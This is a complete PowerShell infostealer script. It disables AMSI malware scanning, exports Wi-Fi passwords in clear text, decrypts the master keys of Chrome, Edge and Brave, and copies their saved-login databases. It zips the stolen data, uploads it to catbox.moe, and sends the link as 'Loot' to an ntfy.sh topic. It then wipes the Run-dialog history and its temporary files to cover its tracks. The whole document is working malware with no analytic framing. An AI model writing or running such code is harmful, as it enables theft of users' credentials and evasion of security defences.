# --- AMSI BYPASS (The 'Blinder') ---
# This renames the internal 'amsiInitFailed' variable to stop scanning
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};
$d=$c.GetField("amsiInitFailed","NonPublic,Static");$d.SetValue($null,$true);

$topic = "data_stwealer_hideen_"

# 1. Load Security
try { Add-Type -AssemblyName System.Security } catch { exit }

# 2. Workspace
$dir = "$env:TEMP\$(65..90|Get-Random -Count 8|%{[char]$_}-join'')"; $zip = "$env:TEMP\update.zip"
mkdir $dir | Out-Null

# 3. WiFi
netsh wlan export profile folder=$dir key=clear | Out-Null

# 4. Browsers (Obfuscated paths to stay quiet)
$app = $env:LOCALAPPDATA
$paths = @{
    "CR" = "$app\Google\Chrome\User Data\Local State"
    "ED" = "$app\Microsoft\Edge\User Data\Local State"
    "BR" = "$app\BraveSoftware\Brave-Browser\User Data\Local State"
}

foreach ($k in $paths.Keys) {
    if (Test-Path $paths[$k]) {
        try {
            $j = Get-Content $paths[$k] -Raw | ConvertFrom-Json
            $e = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
            $u = [System.Security.Cryptography.ProtectedData]::Unprotect($e[5..($e.Length-1)], $null, 'CurrentUser')
            [System.BitConverter]::ToString($u) -replace '-' | Out-File "$dir\$k.txt"
            $db = $paths[$k].Replace("Local State", "Default\Login Data")
            if (Test-Path $db) { Copy-Item $db -Destination "$dir\$k.db" -Force }
        } catch { continue }
    }
}

# 5. Zip & Send
Add-Type -AssemblyName "System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)
$res = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php

if ($res -like "http*") {
    Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot: $res"
}

# 6. Cleanup
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force $dir, $zip -ErrorAction SilentlyContinue
exit
